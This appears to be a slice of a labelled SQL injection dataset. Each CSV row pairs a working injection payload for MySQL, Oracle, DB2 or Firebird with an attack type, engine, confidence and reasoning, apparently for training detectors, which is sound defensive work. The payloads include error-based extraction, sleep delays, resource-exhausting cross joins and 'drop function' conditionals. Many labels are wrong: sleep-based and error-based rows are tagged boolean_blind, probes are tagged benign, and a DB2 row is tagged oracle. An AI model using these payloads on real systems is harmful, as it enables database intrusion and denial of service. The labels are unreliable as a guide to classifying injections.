id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
132,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lnte' = 'lnte,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
133,"1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
134,1' order by 1#,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
135,"1"" ) ) as qvyu where 5962 = 5962 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
136,"1%' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
137,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 5432 = 5432",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
138,"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
139,"1,exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
140,"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'dhqz' = 'dhqz",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
141,"1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
142,1'|| ( select 'jmao' where 3009 = 3009,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
143,"1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
144,"1'|| ( select 'rfjl' where 2476 = 2476 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
145,"1 ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
146,1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',boolean_blind,generic,0.85,Boolean comparison 'and 7859 = 6151' used for data inference,3
147,"1' ) as mvai where 5856 = 5856 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
148,"1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
149,"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xnsj"" like ""xnsj",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
150,"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""ozvp"" = ""ozvp",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
151,-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
152,"1"" ) ) as rpxd where 4929 = 4929",boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
153,1'|| ( select 'noik' from dual where 9851 = 9851,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
154,"1%' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( '%' = '",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
155,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and '%' = '",heavy_query,generic,0.85,Resource-intensive token '500000000' used for timing or DoS,2
156,"1 ) as wust where 3884 = 3884 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
157,"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
158,"1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
159,"1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""kcxw"" = ""kcxw",boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
160,if ( 3831 = 9321 ) select 3831 else drop function ybru--,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
161,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
162,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
163,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
164,-2573 ) ) order by 1#,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
165,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
166,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
167,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
168,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
169,"1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
170,"1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,mysql,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,1
171,1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
172,1'|| ( select 'fwph' where 3791 = 3791,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
173,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
174,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
175,"1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",heavy_query,generic,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
176,"1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
177,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
178,"-7416"" where 7656 = 7656 order by 1--",boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
179,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
180,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
181,"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
182,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'eugs' = 'eugs",error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
183,"1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
184,( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7812 = 7812 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) from dual ),boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
185,"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
186,"1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
187,"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",union_based,oracle,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,3
188,end and ( ( 'eqoc' like 'eqoc,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
189,1' ) as lewd where 3118 = 3118 order by 1--,boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
190,"1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",union_based,mysql,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,1
191,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,oracle,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
192,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni",error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
193,1'|| ( select 'omeg' from dual where 4751 = 4751,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
194,"1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
195,"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
196,"1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
197,"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
198,1'|| ( select 'gved' from dual where 6965 = 6965,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
199,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
200,"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""igop"" = ""igop",error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
